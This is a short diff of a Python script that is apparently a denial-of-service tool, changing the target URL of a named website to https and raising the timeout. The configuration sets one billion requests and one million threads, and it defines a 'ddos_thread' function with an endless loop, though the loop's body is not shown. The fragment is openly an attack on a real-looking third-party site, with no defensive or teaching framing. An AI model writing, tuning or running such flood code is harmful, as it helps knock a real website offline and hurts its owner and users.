@@ -3,10 +3,10 @@ import threading
 import time
 
 # Configuration
-target_url = "http://www.aremaxcess.com"
+target_url = "https://www.aremaxcess.com"
 num_requests = 1000000000  # 1 billion requests
 threads = 1000000  # 1 million threads
-timeout = 30  # Timeout in seconds
+timeout = 60  # Timeout in seconds
 
 def ddos_thread():
     while True:
